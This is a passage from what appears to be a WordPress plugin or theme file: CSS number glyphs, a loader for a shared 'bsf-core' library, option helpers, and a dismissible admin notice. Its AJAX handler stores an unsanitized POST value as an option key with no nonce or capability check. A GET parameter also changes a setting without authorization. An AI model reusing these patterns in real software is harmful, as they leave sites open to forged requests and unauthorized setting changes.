		.bsf-numbers-uni33:before {
			content: "\33";
		}

		.bsf-numbers-uni34:before {
			content: "\34";
		}

		.bsf-numbers-uni35:before {
			content: "\35";
		}

		.bsf-numbers-uni36:before {
			content: "\36";
		}

		.bsf-numbers-uni37:before {
			content: "\37";
		}

		.bsf-numbers-uni38:before {
			content: "\38";
		}

		.bsf-numbers-uni39:before {
			content: "\39";
		}
	</style>
	<?php
}

// bsf core
$bsf_core_version_file = realpath( dirname( __FILE__ ) . '/admin/bsf-core/version.yml' );
if ( is_file( $bsf_core_version_file ) ) {
	global $bsf_core_version, $bsf_core_path;
	$bsf_core_dir = realpath( dirname( __FILE__ ) . '/admin/bsf-core/' );
	$version      = file_get_contents( $bsf_core_version_file );
	if ( version_compare( $version, $bsf_core_version, '>' ) ) {
		$bsf_core_version = $version;
		$bsf_core_path    = $bsf_core_dir;
	}
}
add_action( 'init', 'bsf_core_load', 999 );
if ( ! function_exists( 'bsf_core_load' ) ) {
	function bsf_core_load() {
		global $bsf_core_version, $bsf_core_path;
		if ( is_file( realpath( $bsf_core_path . '/index.php' ) ) ) {
			include_once realpath( $bsf_core_path . '/index.php' );
		}
	}
}

// BSF CORE commom functions
if ( ! function_exists( 'bsf_get_option' ) ) {
	function bsf_get_option( $request = false ) {
		$bsf_options = get_option( 'bsf_options' );
		if ( ! $request ) {
			return $bsf_options;
		} else {
			return ( isset( $bsf_options[ $request ] ) ) ? $bsf_options[ $request ] : false;
		}
	}
}
if ( ! function_exists( 'bsf_update_option' ) ) {
	function bsf_update_option( $request, $value ) {
		$bsf_options             = get_option( 'bsf_options' );
		$bsf_options[ $request ] = $value;

		return update_option( 'bsf_options', $bsf_options );
	}
}
add_action( 'wp_ajax_bsf_dismiss_notice', 'bsf_dismiss_notice' );
if ( ! function_exists( 'bsf_dismiss_notice' ) ) {
	function bsf_dismiss_notice() {
		$notice = $_POST['notice'];
		$x      = bsf_update_option( $notice, true );
		echo ( $x ) ? true : false;
		die();
	}
}

add_action( 'admin_init', 'bsf_core_check', 10 );
if ( ! function_exists( 'bsf_core_check' ) ) {
	function bsf_core_check() {
		if ( ! defined( 'BSF_CORE' ) ) {
			if ( ! bsf_get_option( 'hide-bsf-core-notice' ) ) {
				add_action( 'admin_notices', 'bsf_core_admin_notice' );
			}
		}
	}
}

if ( ! function_exists( 'bsf_core_admin_notice' ) ) {
	function bsf_core_admin_notice() {
		?>
		<script type="text/javascript">
			(function ($) {
				$(document).ready(function () {
					$(document).on("click", ".bsf-notice", function () {
						var bsf_notice_name = $(this).attr("data-bsf-notice");
						$.ajax({
							url: ajaxurl,
							method: 'POST',
							data: {
								action: "bsf_dismiss_notice",
								notice: bsf_notice_name
							},
							success: function (response) {
								console.log(response);
							}
						})
					})
				});
			})(jQuery);
		</script>
		<div class="bsf-notice update-nag notice is-dismissible" data-bsf-notice="hide-bsf-core-notice">
			<p><?php _e( 'License registration and extensions are not part of plugin/theme anymore. Kindly download and install "BSF CORE" plugin to manage your licenses and extensins.', 'bsf' ); ?></p>
		</div>
		<?php
	}
}

if ( isset( $_GET['hide-bsf-core-notice'] ) && $_GET['hide-bsf-core-notice'] === 're-enable' ) {
	$x = bsf_update_option( 'hide-bsf-core-notice', false );
}


function is_login_page() {
	return in_array( $GLOBALS['pagenow'], array( 'wp-login.php', 'wp-register.php' ) );
}
// end of common functions
